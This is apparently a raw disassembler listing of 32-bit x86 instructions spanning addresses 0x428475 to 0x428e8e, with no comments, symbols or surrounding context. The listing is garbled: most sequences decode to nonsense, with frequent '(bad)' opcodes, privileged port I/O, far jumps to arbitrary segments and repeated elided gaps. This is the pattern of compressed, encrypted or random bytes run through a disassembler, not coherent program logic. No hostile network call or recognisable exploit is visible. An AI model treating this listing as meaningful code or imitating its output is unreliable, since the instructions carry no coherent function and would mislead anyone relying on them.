  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xb8abfb32
  428481:	add    eax,0xaf19a95a
  428486:	add    DWORD PTR [eax],eax
  428488:	add    eax,0xe1000001
  42848d:	cmp    esp,DWORD PTR [esi-0x80]
  428490:	iret   
  428491:	sbb    cl,BYTE PTR [eax+0x10]
  428494:	push   cs
  428495:	push   di
  428497:	and    al,0xc
  428499:	in     al,0x77
  42849b:	popf   
  42849c:	and    ch,BYTE PTR [edx-0x72]
  42849f:	outs   dx,DWORD PTR ds:[esi]
  4284a0:	stos   BYTE PTR es:[edi],al
  4284a1:	sub    cl,BYTE PTR ds:0x433e16a8
  4284a7:	dec    di
  4284a9:	inc    eax
  4284aa:	cli    
  4284ab:	adc    ecx,edi
  4284ad:	lods   al,BYTE PTR ds:[esi]
  4284ae:	push   0x6c00e335
  4284b3:	adc    esp,DWORD PTR [esi+ecx*2-0x75beca62]
  4284ba:	dec    edi
  4284bb:	icebp  
  4284bc:	push   0x8ee64703
  4284c1:	in     al,0x3
  4284c3:	jb     0x42844d
  4284c5:	mov    BYTE PTR [esi+0x84c93e3],ch
  4284cb:	sbb    ah,BYTE PTR [ebx]
  4284cd:	push   0x7fdf92b6
  4284d2:	je     0x4284d0
  4284d4:	push   cs
  4284d5:	push   ebp
  4284d6:	cli    
  4284d7:	and    esi,ebp
  4284d9:	mov    eax,0xedb6f757
  4284de:	add    eax,0x12a95c60
  4284e3:	std    
  4284e4:	out    dx,al
  4284e5:	scas   al,BYTE PTR es:[edi]
  4284e6:	mov    ah,0x75
  4284e8:	push   esp
  4284e9:	mov    ebp,0xc6f148ec
  4284ee:	into   
  4284ef:	ror    ebx,1
  4284f1:	cmc    
  4284f2:	xchg   esi,eax
  4284f3:	rcl    al,cl
  4284f5:	push   edi
  4284f6:	ja     0x42855e
  4284f8:	fisttp WORD PTR [esi+0x53d20604]
  4284fe:	mov    bl,0xeb
  428500:	sbb    DWORD PTR [ebp+0x293d1391],0xd0861d0f
  42850a:	and    ebp,DWORD PTR [esi-0x74]
  42850d:	test   al,0xa7
  42850f:	jg     0x42858b
  428511:	sbb    cl,BYTE PTR [ebx-0x17ebb5a3]
  428517:	inc    edx
  428518:	mov    al,0x28
  42851a:	push   esp
  42851b:	inc    esp
  42851c:	(bad)  
  42851d:	jecxz  0x428549
  42851f:	aam    0xf9
  428521:	loope  0x42851d
  428523:	fild   QWORD PTR [ebx+0x1c]
  428526:	fistp  WORD PTR [edx]
  428528:	mov    ds,eax
  42852a:	scas   al,BYTE PTR es:[edi]
  42852b:	ins    DWORD PTR es:[edi],dx
  42852c:	or     dl,bh
  42852e:	adc    ebp,DWORD PTR [ecx]
  428530:	xor    al,0x5
  428532:	mov    ebp,0x8eb3a2fe
  428537:	aad    0x26
  428539:	mov    WORD PTR [edx],es
  42853b:	xchg   esp,eax
  42853c:	sbb    eax,0xdcfde6fd
  428541:	sbb    dl,BYTE PTR [ecx]
  428543:	arpl   si,dx
  428545:	pop    eax
  428546:	adc    BYTE PTR [eax+0x14],0x31
  42854a:	sbb    al,0x11
  42854c:	je     0x428507
  42854e:	jmp    0x9e725b5e
  428553:	mov    ds:0xde303c9,eax
  428558:	jae    0x42853f
  42855a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42855b:	pop    edi
  42855c:	and    eax,DWORD PTR [ebp-0x2d15ec88]
  428562:	push   edi
  428563:	into   
  428564:	gs aam 0x92
  428567:	mov    ecx,0xf06fbb8e
  42856c:	xor    BYTE PTR [edx+0x323c8648],dh
  428572:	test   DWORD PTR [esi],edi
  428574:	into   
  428575:	cs loop 0x42852e
  428578:	out    0xbb,al
  42857a:	shl    edx,1
  42857c:	add    cl,BYTE PTR [edx+0x4bab755]
  428582:	aam    0x40
  428584:	sbb    esp,DWORD PTR [ecx-0x37281d29]
  42858a:	jne    0x4285c0
  42858c:	sti    
  42858d:	stos   DWORD PTR es:[edi],eax
  42858e:	jge    0x428548
  428590:	(bad)  
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xb239a3f6
  428602:	cmp    eax,0x1b01e66
  428607:	add    BYTE PTR ds:0xc8000001,al
  42860d:	cmc    
  42860e:	lea    eax,[edi+0x50f7a2ee]
  428614:	jne    0x428666
  428616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428617:	sar    ebx,1
  428619:	jno    0x42867c
  42861b:	gs xor bh,BYTE PTR ss:[esi-0x3bf6b065]
  428623:	mov    eax,0x403d2fba
  428628:	popf   
  428629:	inc    edx
  42862a:	loopne 0x428628
  42862c:	fxch   st(1)
  42862e:	ret    
  42862f:	push   esi
  428630:	mov    ah,ah
  428632:	mov    dh,0xb3
  428634:	je     0x42869e
  428636:	push   ecx
  428637:	ss xchg ebx,eax
  428639:	jae    0x428634
  42863b:	jge    0x428615
  42863d:	outs   dx,DWORD PTR ds:[esi]
  42863e:	sti    
  42863f:	mov    ax,ds:0xa938c5b7
  428645:	and    BYTE PTR [edi+0x4e],al
  428648:	das    
  428649:	mov    WORD PTR [edx],fs
  42864b:	or     al,0xfd
  42864d:	loopne 0x428674
  42864f:	test   DWORD PTR [edx+0x5d1d2401],ebx
  428655:	jnp    0x42865a
  428657:	jmp    0x428656
  428659:	push   esp
  42865a:	addr16 loop 0x428643
  42865d:	xchg   edx,eax
  42865e:	rcr    DWORD PTR [edx],1
  428660:	stc    
  428661:	mov    ecx,0x1d312818
  428666:	jmp    0x300e:0xd368c26c
  42866d:	aas    
  42866e:	nop
  42866f:	fisttp DWORD PTR [eax+0x4e]
  428672:	mov    eax,0x2a914317
  428677:	iret   
  428678:	aas    
  428679:	or     al,BYTE PTR [ecx]
  42867b:	mov    eax,0xd8e71041
  428680:	mov    ah,0x68
  428682:	es dec ebp
  428684:	sbb    edi,DWORD PTR [ebx]
  428686:	cmp    al,0x19
  428688:	dec    eax
  428689:	or     al,0xce
  42868b:	or     BYTE PTR [eax+0x29],ch
  42868e:	jnp    0x428702
  428690:	aaa    
  428691:	out    dx,al
  428692:	fld    QWORD PTR ds:0x71055741
  428698:	sub    BYTE PTR [esi],dh
  42869a:	push   ds
  42869b:	adc    al,0xcb
  42869e:	push   edx
  42869f:	inc    edi
  4286a0:	push   esp
  4286a1:	add    ebp,DWORD PTR [esi-0x1ff7e5b7]
  4286a7:	cmp    DWORD PTR [edi],edi
  4286a9:	xchg   ecx,eax
  4286aa:	jmp    0x4183:0x1e411cc0
  4286b1:	arpl   ax,bx
  4286b3:	arpl   WORD PTR [edx+eax*8],sp
  4286b6:	push   esp
  4286b7:	mov    cl,0xd
  4286b9:	add    edi,0xffffffbd
  4286bc:	ret    0xa4c9
  4286bf:	mov    eax,0x4e2d209b
  4286c4:	sbb    al,BYTE PTR [ebx+0x63b05b96]
  4286ca:	ja     0x428659
  4286cc:	adc    eax,0x8b3bea1c
  4286d1:	push   edi
  4286d2:	clc    
  4286d3:	sti    
  4286d4:	sbb    DWORD PTR [ecx-0x2],esp
  4286d7:	xlat   BYTE PTR ds:[ebx]
  4286d8:	call   DWORD PTR [edx+0x1a]
  4286db:	retf   0xb925
  4286de:	sar    bh,1
  4286e0:	pop    ss
  4286e1:	aas    
  4286e2:	and    bl,BYTE PTR [ebx-0x2ede7a8f]
  4286e8:	retf   
  4286e9:	aad    0x3
  4286eb:	dec    esi
  4286ec:	xor    ecx,DWORD PTR [esi+0x1809c71f]
  4286f2:	jno    0x428708
  4286f4:	faddp  st(0),st
  4286f6:	std    
  4286f7:	add    DWORD PTR [ecx+0x4a14a4d0],esi
  4286fd:	inc    eax
  4286fe:	rcl    DWORD PTR [ebx-0x41fdd357],cl
  428704:	cmp    al,0x41
  428706:	out    0x7d,eax
  428708:	xor    al,0x2b
  42870a:	cmp    BYTE PTR [ecx],0x40
  42870d:	mov    dh,0x28
  42870f:	clc    
  428710:	pushf  
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x12827e96
  428783:	(bad)  
  428784:	and    esi,DWORD PTR [ecx+0x1050001]
  42878a:	add    BYTE PTR [eax],al
  42878c:	or     cl,BYTE PTR [eax+0x31]
  42878f:	shr    BYTE PTR [eax+eax*4],cl
  428792:	rcr    ebx,1
  428794:	out    dx,al
  428795:	retf   
  428796:	iret   
  428797:	sar    dh,1
  428799:	jmp    0xd8eeee2d
  42879e:	mov    BYTE PTR [edi-0x69],cl
  4287a1:	add    eax,0x24b3abcc
  4287a6:	dec    edx
  4287a7:	xchg   DWORD PTR [ebx-0x70ae1d69],edi
  4287ad:	sbb    al,0x89
  4287af:	data16 jns 0x42874b
  4287b2:	xor    BYTE PTR [esi+0x51],0xd8
  4287b6:	pop    ebp
  4287b7:	sbb    cl,BYTE PTR [edi+edx*1]
  4287ba:	(bad)  
  4287bc:	fisubr WORD PTR [ebx+ebx*4-0x3e]
  4287c0:	data16 out dx,al
  4287c2:	inc    esp
  4287c3:	pop    edx
  4287c4:	daa    
  4287c5:	out    dx,eax
  4287c6:	in     eax,0x6a
  4287c8:	dec    edx
  4287c9:	mov    edi,0xf717a867
  4287ce:	aas    
  4287cf:	addr16 in eax,0xa0
  4287d2:	retf   0x5f9
  4287d5:	retf   
  4287d6:	jmp    0x49019a7e
  4287db:	out    dx,eax
  4287dc:	mov    ds:0x4dd2f5f5,al
  4287e1:	add    edx,DWORD PTR ds:0xd84ab45e
  4287e7:	mov    bh,BYTE PTR [ebp-0x7e3b6f9b]
  4287ed:	js     0x42882e
  4287ef:	(bad)  
  4287f0:	mov    eax,0x118e2a60
  4287f5:	loopne 0x428802
  4287f7:	retf   0x3759
  4287fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287fb:	enter  0x7503,0x68
  4287ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428800:	aaa    
  428801:	xor    eax,0x8a3eb8cd
  428806:	push   ecx
  428807:	test   al,0xaf
  428809:	adc    al,0xbf
  42880b:	into   
  42880c:	dec    esi
  42880d:	lock cmp eax,DWORD PTR ss:[edx]
  428811:	fwait
  428812:	mov    dh,0x8d
  428814:	inc    ebx
  428815:	and    DWORD PTR [edx+0x5e],ebx
  428818:	(bad)  
  428819:	jns    0x428882
  42881b:	mov    dh,0xc
  42881d:	js     0x4287f7
  42881f:	ficom  DWORD PTR [ecx]
  428821:	mov    ecx,0xa418f09d
  428826:	push   esi
  428827:	stos   DWORD PTR es:[edi],eax
  428828:	test   DWORD PTR [edx],ebx
  42882a:	(bad)  
  42882b:	rol    BYTE PTR [eax],1
  42882d:	in     al,dx
  42882e:	lds    eax,FWORD PTR [edi-0x4a08ce6c]
  428834:	cld    
  428835:	xchg   ebx,eax
  428836:	into   
  428837:	mov    al,ds:0xe6be5634
  42883d:	xor    BYTE PTR [eax-0x33],al
  428840:	ss vmwrite ebx,ebx
  428844:	mov    ss,WORD PTR [edx+ebx*8+0x19ba540d]
  42884b:	cmp    al,0x4d
  42884d:	inc    esi
  42884e:	jne    0x428813
  428850:	xchg   esp,eax
  428851:	mov    bh,0xe3
  428853:	mov    dh,0xce
  428855:	into   
  428856:	sti    
  428857:	out    0x72,al
  428859:	sub    eax,0x3cc2a5a4
  42885e:	push   eax
  42885f:	aas    
  428860:	pop    ds
  428861:	mov    esi,0x98b1f802
  428866:	ds push eax
  428868:	inc    eax
  428869:	stos   DWORD PTR es:[edi],eax
  42886a:	aam    0x45
  42886c:	into   
  42886d:	push   ecx
  42886e:	mov    bl,0x10
  428870:	push   ss
  428871:	(bad)  
  428872:	ds pop ss
  428874:	rcl    ecx,0x13
  428877:	(bad)  
  428878:	xchg   ebp,eax
  428879:	stos   BYTE PTR es:[edi],al
  42887a:	test   eax,0x6409493f
  42887f:	repz add BYTE PTR [ecx+0x7f],ch
  428883:	out    0x7f,eax
  428885:	fcom   DWORD PTR [eax+edx*1-0x1204dcae]
  42888c:	cmp    DWORD PTR [edi+0xfa116e],ebp
	...
  4288f2:	add    BYTE PTR [eax],al
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x701162f1],bx
  428902:	xchg   ecx,eax
  428903:	in     eax,dx
  428904:	sub    BYTE PTR [edx+0x1050001],dh
  42890a:	add    BYTE PTR [eax],al
  42890c:	inc    eax
  42890d:	icebp  
  42890e:	lds    ecx,FWORD PTR [edi+0xfc267b8]
  428914:	jecxz  0x428910
  428916:	sahf   
  428917:	mov    edi,0xc173eddd
  42891c:	sbb    eax,0xb25a9915
  428921:	cmc    
  428922:	das    
  428923:	xchg   edx,eax
  428924:	cs and eax,0xc6725a55
  42892a:	iret   
  42892b:	push   0xffffffea
  42892d:	inc    ecx
  42892e:	std    
  42892f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428930:	shr    DWORD PTR [eax-0x5639536b],1
  428936:	pushf  
  428937:	pop    edx
  428938:	mov    eax,0x5ccc5a7f
  42893d:	add    DWORD PTR [ecx+0x1e],ebp
  428940:	and    DWORD PTR [ebx],ebp
  428942:	fild   WORD PTR [eax+0x19004d07]
  428948:	js     0x4289b6
  42894a:	sub    al,0x2f
  42894c:	jo     0x428974
  42894e:	push   edi
  42894f:	add    dl,0x6a
  428952:	and    esi,DWORD PTR [esi]
  428954:	pop    eax
  428955:	aaa    
  428956:	push   ebx
  428957:	dec    edi
  428958:	rcl    BYTE PTR [ebx+esi*1-0x37],1
  42895c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42895d:	pop    eax
  42895e:	mov    es,WORD PTR [esi+edx*4]
  428961:	xchg   ecx,eax
  428962:	jno    0x42894d
  428964:	cwde   
  428965:	jbe    0x428989
  428967:	xor    DWORD PTR [ebx],edx
  428969:	xchg   ecx,eax
  42896a:	pusha  
  42896b:	add    al,0xb4
  42896d:	fst    st(6)
  42896f:	nop
  428970:	mov    al,ds:0x78d36b92
  428975:	int    0x29
  428977:	loopne 0x428938
  428979:	or     eax,0xdc1499ba
  42897e:	mov    eax,0xcc4e4b3a
  428983:	and    DWORD PTR [eax+edi*4-0x105b22f6],edx
  42898a:	lock int3 
  42898c:	inc    ebx
  42898d:	nop
  42898e:	mov    eax,ds:0x99c03d0
  428993:	imul   edx,DWORD PTR [ebp+edx*4+0x5c90073],0xffffff8d
  42899b:	mov    al,ah
  42899d:	in     eax,0xad
  42899f:	pop    edx
  4289a0:	and    edi,DWORD PTR [edx]
  4289a2:	out    0x4a,al
  4289a4:	adc    dl,BYTE PTR [ecx]
  4289a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289a7:	ins    BYTE PTR es:[edi],dx
  4289a8:	lock pop eax
  4289aa:	cmp    al,0xca
  4289ac:	sub    eax,DWORD PTR [esi+0x56fd362]
  4289b2:	clc    
  4289b3:	into   
  4289b4:	nop
  4289b5:	jmp    0x88d807ad
  4289ba:	in     eax,dx
  4289bb:	ins    DWORD PTR es:[edi],dx
  4289bc:	(bad)  
  4289be:	pusha  
  4289bf:	xchg   ebx,eax
  4289c0:	cld    
  4289c1:	mov    dl,0xad
  4289c3:	int3   
  4289c4:	jmp    0xb91893f7
  4289c9:	pushw  0x42
  4289cc:	div    DWORD PTR [eax+eax*8+0xe]
  4289d0:	adc    BYTE PTR [ecx+0x6d],dl
  4289d3:	fistp  QWORD PTR [edx+0x5a9e699f]
  4289d9:	mov    edx,0x38d149ef
  4289de:	sahf   
  4289df:	and    DWORD PTR ds:0x4e59d665,esp
  4289e5:	jb     0x428a48
  4289e7:	popf   
  4289e8:	aas    
  4289e9:	push   es
  4289ea:	jnp    0x428978
  4289ec:	test   eax,0xf0682a10
  4289f1:	(bad)  
  4289f2:	loop   0x4289bf
  4289f4:	les    edi,FWORD PTR [eax+edi*1-0x50]
  4289f8:	dec    ecx
  4289f9:	stos   DWORD PTR es:[edi],eax
  4289fa:	add    edx,DWORD PTR [edi+0x7a]
  4289fd:	aaa    
  4289fe:	cmp    al,0x55
  428a00:	imul   ecx,DWORD PTR [ecx+0x43],0x3d
  428a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a05:	ss and al,0x96
  428a08:	cmp    dh,bh
  428a0a:	ss pop esi
  428a0c:	movq   mm0,QWORD PTR [ecx]
  428a0f:	enter  0xe7,0x0
	...
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x7a0d2713]
  428a83:	imul   ebp,DWORD PTR ds:0x50001b3,0xdd000001
  428a8d:	cmp    al,0xa
  428a8f:	jmp    0x428a64
  428a91:	push   eax
  428a92:	pop    ebx
  428a93:	sub    al,0x20
  428a95:	mov    edi,0x24e14781
  428a9a:	or     eax,0x12b1d0d9
  428a9f:	xchg   edx,eax
  428aa0:	imul   eax,DWORD PTR [eax],0x27
  428aa3:	nop    ecx
  428aa6:	loopne 0x428ae8
  428aa8:	push   ecx
  428aa9:	lock sti 
  428aab:	ins    BYTE PTR es:[edi],dx
  428aac:	jno    0x428a9f
  428aae:	mov    bh,0xdb
  428ab0:	add    DWORD PTR [edx],ecx
  428ab2:	adc    edi,ebp
  428ab4:	rcr    edi,1
  428ab6:	add    al,0x85
  428ab8:	mov    esp,0x8310d6aa
  428abd:	mov    edi,0xff738ab
  428ac2:	pop    edx
  428ac3:	cmp    eax,DWORD PTR [esi+0x9]
  428ac6:	mov    edx,ebp
  428ac8:	adc    al,0x77
  428aca:	cmp    al,0x69
  428acc:	mov    bl,0x68
  428ace:	int    0x2d
  428ad0:	shl    DWORD PTR [ebp-0x167eecf7],cl
  428ad6:	js     0x428aae
  428ad8:	mov    ds:0x3a7eece5,al
  428add:	nop
  428ade:	sub    eax,ecx
  428ae0:	pop    ebx
  428ae1:	mov    eax,ds:0xfb00db14
  428ae6:	jmp    0x8f8:0xfdd15743
  428aed:	aaa    
  428aee:	scas   al,BYTE PTR es:[edi]
  428aef:	dec    edx
  428af0:	mov    dh,0xcf
  428af2:	mov    bl,dh
  428af4:	mov    ?,WORD PTR [si]
  428af7:	mov    ebx,0x8fbc9f62
  428afc:	cli    
  428afd:	int3   
  428afe:	aad    0xa0
  428b00:	sar    ch,cl
  428b02:	pop    ecx
  428b03:	mov    edi,ebp
  428b05:	jle    0x428b38
  428b07:	test   esi,ebp
  428b09:	out    0xc0,eax
  428b0b:	push   ebx
  428b0c:	sbb    eax,0x8efcebc8
  428b11:	push   esp
  428b12:	into   
  428b13:	iret   
  428b14:	or     BYTE PTR ds:0xd29372d8,dh
  428b1a:	int3   
  428b1b:	in     al,dx
  428b1c:	in     eax,0xa6
  428b1e:	in     al,0x1d
  428b20:	add    DWORD PTR [eax-0x18],esi
  428b23:	das    
  428b24:	dec    esp
  428b25:	xchg   ebx,eax
  428b26:	loopne 0x428ae0
  428b28:	cmp    BYTE PTR [eax+ebp*4-0x455e58e8],al
  428b2f:	mov    al,ds:0xb64b9fd
  428b34:	sbb    ch,dh
  428b36:	and    eax,0xfb3fe5f7
  428b3b:	jnp    0x428b59
  428b3d:	add    BYTE PTR [edi-0x3d42ce1a],ah
  428b43:	call   0xd139:0x70c24bc2
  428b4a:	and    DWORD PTR [edx],0x5e6bc44d
  428b50:	xchg   esi,eax
  428b51:	cmp    eax,DWORD PTR [edx]
  428b53:	push   es
  428b54:	xor    BYTE PTR [esi-0x986274d],ch
  428b5a:	scas   eax,DWORD PTR es:[edi]
  428b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b5c:	pop    ss
  428b5d:	add    eax,0xf8543368
  428b62:	stos   DWORD PTR es:[edi],eax
  428b63:	push   ecx
  428b64:	repnz inc edi
  428b66:	std    
  428b67:	jmp    0x428af8
  428b69:	or     ebp,ebp
  428b6b:	in     eax,0xc2
  428b6d:	sub    BYTE PTR [edx],bh
  428b6f:	daa    
  428b70:	xchg   esp,eax
  428b71:	push   0xe247f9ff
  428b76:	inc    esi
  428b77:	xchg   ecx,eax
  428b78:	mov    dl,BYTE PTR [edi+0x4e]
  428b7b:	in     eax,0xd2
  428b7d:	mov    cl,BYTE PTR [edi-0x52]
  428b80:	and    esi,ecx
  428b82:	dec    DWORD PTR [esi-0x4f]
  428b85:	hlt    
  428b86:	and    eax,0x5cfdd2de
  428b8b:	add    DWORD PTR [ecx],ecx
  428b8d:	pop    es
  428b8e:	xchg   cl,cl
  428b90:	rol    BYTE PTR [eax],cl
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x64fbd8c1
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ecx+0x1],bl
  428c0e:	sbb    cl,dl
  428c10:	pop    edx
  428c11:	test   DWORD PTR [edx],0x1536a3d
  428c17:	div    BYTE PTR [eax]
  428c19:	cmc    
  428c1a:	adc    esi,DWORD PTR [edi-0x2c43d3a]
  428c20:	aas    
  428c21:	or     eax,0x76aa76d1
  428c26:	sti    
  428c27:	xchg   BYTE PTR [ecx-0x55],ch
  428c2a:	popf   
  428c2b:	cld    
  428c2c:	cli    
  428c2d:	mov    eax,0xc2f13b65
  428c32:	jle    0x428c1c
  428c34:	lea    ecx,[ebx]
  428c36:	cmc    
  428c37:	(bad)  
  428c38:	nop
  428c39:	mov    BYTE PTR [esi+esi*4],ah
  428c3c:	cmp    al,0x54
  428c3e:	xchg   edi,eax
  428c3f:	mov    ds,WORD PTR [edx+edx*8-0x4c]
  428c43:	jg     0x428bd4
  428c45:	push   ebp
  428c46:	lods   al,BYTE PTR ds:[esi]
  428c47:	add    edx,DWORD PTR [esi+ecx*8+0x5733be63]
  428c4e:	mov    eax,ds:0x13fdcaf4
  428c53:	idiv   DWORD PTR [edi]
  428c55:	push   ss
  428c56:	and    eax,0xe2d9aec5
  428c5b:	in     eax,dx
  428c5c:	xor    eax,0x2b9759d7
  428c61:	inc    ecx
  428c62:	push   ds
  428c63:	ror    DWORD PTR [eax-0x5c6f128f],1
  428c69:	cmp    DWORD PTR [ecx],0x5b
  428c6c:	adc    ah,BYTE PTR [edi]
  428c6e:	mov    dh,0x31
  428c70:	pop    eax
  428c71:	xlat   BYTE PTR ds:[ebx]
  428c72:	xchg   BYTE PTR [ecx-0x2e7775d8],dh
  428c78:	mov    eax,ds:0x2dfbfcb5
  428c7d:	xchg   esp,eax
  428c7e:	jnp    0x428ca6
  428c80:	and    al,0x7b
  428c82:	sub    ah,BYTE PTR [edi+0x54]
  428c85:	add    BYTE PTR [edx+esi*4],dh
  428c88:	xor    eax,eax
  428c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c8b:	sub    DWORD PTR [si],esi
  428c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c8f:	adc    cl,BYTE PTR [edx]
  428c91:	push   eax
  428c92:	in     eax,0x36
  428c94:	pop    ds
  428c95:	pop    es
  428c96:	xchg   eax,ebx
  428c98:	in     al,0x98
  428c9a:	ins    BYTE PTR es:[edi],dx
  428c9b:	inc    edi
  428c9c:	mov    DWORD PTR [ebx],eax
  428c9e:	or     ecx,DWORD PTR [ebp+0x7365f11b]
  428ca4:	pop    edi
  428ca5:	ret    0x7431
  428ca8:	inc    edx
  428ca9:	(bad)  
  428caa:	ins    BYTE PTR es:[edi],dx
  428cab:	jmp    0xd708:0x899e632
  428cb2:	jg     0x428c72
  428cb4:	mov    bl,0xad
  428cb6:	cmp    dl,BYTE PTR [ebp-0x5ba0da52]
  428cbc:	(bad)  
  428cbd:	mul    DWORD PTR [ecx+0x11c68019]
  428cc3:	mov    WORD PTR [eax+ebx*2-0x72],cs
  428cc7:	lock (bad) 
  428cc9:	sbb    cl,BYTE PTR [ebp-0x28bd7b36]
  428ccf:	mov    DWORD PTR ds:0xea1bae16,esp
  428cd5:	xlat   BYTE PTR ds:[ebx]
  428cd6:	popa   
  428cd7:	or     dl,bl
  428cd9:	inc    eax
  428cda:	mov    bh,0xc0
  428cdc:	(bad)  
  428cdd:	adc    DWORD PTR [ebx+0x7a],esp
  428ce0:	xor    DWORD PTR [edx-0x339ec9ca],esi
  428ce6:	(bad)  
  428ce7:	cdq    
  428ce8:	pop    ss
  428ce9:	(bad)  
  428cea:	(bad)  
  428ceb:	push   ebx
  428cec:	push   ds
  428ced:	jbe    0x428cf5
  428cef:	fdiv   QWORD PTR [esi-0x4f839c2d]
  428cf5:	lahf   
  428cf6:	pop    ebx
  428cf7:	out    dx,al
  428cf8:	test   DWORD PTR [eax+0x186ceac2],esp
  428cfe:	int    0x19
  428d00:	xor    eax,0xc6757abb
  428d05:	test   eax,0x8efb0f74
  428d0a:	fs xor eax,0x9d39afdc
  428d10:	inc    eax
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x7b0d
  428d82:	inc    eax
  428d83:	mov    eax,ds:0x1b537
  428d88:	add    eax,0x2f000001
  428d8d:	inc    ebx
  428d8e:	mov    esp,es
  428d90:	loopne 0x428d3c
  428d92:	sbb    ah,BYTE PTR [ebx]
  428d94:	js     0x428e10
  428d96:	lods   al,BYTE PTR ds:[esi]
  428d97:	xchg   esi,eax
  428d98:	aas    
  428d99:	scas   al,BYTE PTR es:[edi]
  428d9a:	ficom  DWORD PTR [ebx+esi*1-0x4]
  428d9e:	sub    edi,DWORD PTR [di+0x60]
  428da2:	call   0x10d4:0x3c2bc96a
  428da9:	push   ds
  428daa:	in     al,dx
  428dab:	pop    eax
  428dac:	leave  
  428dad:	cld    
  428dae:	xchg   esi,eax
  428daf:	shl    ah,cl
  428db1:	jecxz  0x428dff
  428db3:	mov    eax,ds:0x1598dba1
  428db8:	sub    BYTE PTR [edx-0x2e2593c3],ch
  428dbe:	jnp    0x428d97
  428dc0:	jg     0x428d65
  428dc2:	loope  0x428d9e
  428dc4:	mov    cl,0x94
  428dc6:	imul   esp,DWORD PTR [esi+0x36],0x3faeb57d
  428dcd:	loop   0x428db5
  428dcf:	mov    ecx,0xb188df1c
  428dd4:	aaa    
  428dd5:	inc    edx
  428dd6:	or     eax,0x6db8f706
  428ddb:	xchg   esp,eax
  428ddc:	inc    ecx
  428ddd:	jg     0x428e1b
  428ddf:	mul    dl
  428de1:	lods   al,BYTE PTR ds:[esi]
  428de2:	cmp    eax,edx
  428de4:	push   ss
  428de5:	jge    0x428de2
  428de7:	push   ebx
  428de8:	cs mov edx,0x2a28af8b
  428dee:	cwde   
  428def:	mov    ecx,DWORD PTR ds:0x19753182
  428df5:	jae    0x428ddf
  428df7:	aam    0x7e
  428df9:	clc    
  428dfa:	sub    bl,BYTE PTR [eax]
  428dfc:	shl    DWORD PTR [edi+0xfe5044],0xd8
  428e03:	in     eax,0x95
  428e05:	(bad)  
  428e07:	xchg   esi,eax
  428e08:	cli    
  428e09:	bound  esi,QWORD PTR [esi-0x65]
  428e0c:	mov    cs,WORD PTR [eax]
  428e0e:	fs je  0x428e6e
  428e11:	push   edx
  428e12:	hlt    
  428e13:	loopne 0x428e60
  428e15:	sbb    eax,0xe5eee03d
  428e1a:	mov    dh,0x81
  428e1c:	std    
  428e1d:	rcl    DWORD PTR [eax+0x57],cl
  428e20:	test   BYTE PTR [ecx],al
  428e22:	lods   eax,DWORD PTR ds:[esi]
  428e23:	xor    BYTE PTR [ebp+eax*1-0x413692f7],dh
  428e2a:	popf   
  428e2b:	pop    edx
  428e2c:	js     0x428eaa
  428e2e:	push   ebp
  428e2f:	mov    al,ds:0x4e857353
  428e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e35:	fnsave [eax-0x5f49d3da]
  428e3b:	jecxz  0x428e13
  428e3d:	out    0xc6,al
  428e3f:	lods   eax,DWORD PTR ds:[esi]
  428e40:	lahf   
  428e41:	mov    bh,0xae
  428e43:	push   ebp
  428e44:	xor    al,0xea
  428e46:	gs jp  0x428e05
  428e49:	xchg   esp,eax
  428e4a:	pushf  
  428e4b:	fld    TBYTE PTR [edi]
  428e4d:	pushf  
  428e4e:	mov    dl,0xb4
  428e50:	pusha  
  428e51:	jle    0x428e4d
  428e53:	es sub ebx,esi
  428e56:	jp     0x428ed7
  428e58:	jmp    0x647f:0xb2c75a1f
  428e5f:	dec    ebx
  428e60:	or     BYTE PTR [ecx],0x76
  428e63:	ret    
  428e64:	(bad)
  428e68:	loop   0x428df8
  428e6a:	out    0x76,eax
  428e6c:	xor    DWORD PTR [edx+0x4da3a02a],eax
  428e72:	in     eax,0x9e
  428e74:	stc    
  428e75:	mov    al,BYTE PTR [ebx]
  428e77:	into   
  428e78:	cld    
  428e79:	pop    esi
  428e7a:	rcl    DWORD PTR [ecx-0x75],1
  428e7d:	xchg   DWORD PTR [ecx+edi*1+0x9],edi
  428e81:	pop    edi
  428e82:	fdivr  DWORD PTR [esi+esi*1]
  428e85:	sub    eax,0x5949ee6b
  428e8a:	mov    bl,0xe1
  428e8c:	out    0x6b,eax
  428e8e:	shr    al,1
